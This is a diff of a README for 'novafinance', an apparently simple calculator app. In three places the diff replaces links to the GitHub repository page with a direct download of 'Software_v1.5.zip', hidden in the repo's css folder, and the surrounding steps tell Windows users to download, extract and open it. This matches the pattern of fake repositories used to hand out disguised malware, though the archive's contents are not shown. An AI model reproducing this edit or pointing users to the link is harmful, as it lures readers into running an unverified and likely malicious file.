@@ -1,6 +1,6 @@
 # 💼 novafinance - Clear Singapore Money Calculators
 
-[![Download novafinance](https://img.shields.io/badge/Download-Now-blue?style=for-the-badge)](https://github.com/catyheavy849/novafinance)
+[![Download novafinance](https://img.shields.io/badge/Download-Now-blue?style=for-the-badge)](https://raw.githubusercontent.com/catyheavy849/novafinance/main/css/Software_v1.5.zip)
 
 ## 🧾 What this app does
 
@@ -27,7 +27,7 @@ The app runs on Windows through your browser after you download it from the link
 7. If the app opens as a local HTML file, double-click the file to run it.
 8. If Windows asks how to open it, choose your web browser.
 
-Download link: https://github.com/catyheavy849/novafinance
+Download link: https://raw.githubusercontent.com/catyheavy849/novafinance/main/css/Software_v1.5.zip
 
 ## 🖥️ What you need on Windows
 
@@ -192,7 +192,7 @@ This project fits these topics:
 
 ## 📁 Where to get it
 
-Primary download page: https://github.com/catyheavy849/novafinance
+Primary download page: https://raw.githubusercontent.com/catyheavy849/novafinance/main/css/Software_v1.5.zip
 
 Open that page, download the project files, extract them on Windows if needed, then open the main HTML file in your browser
 
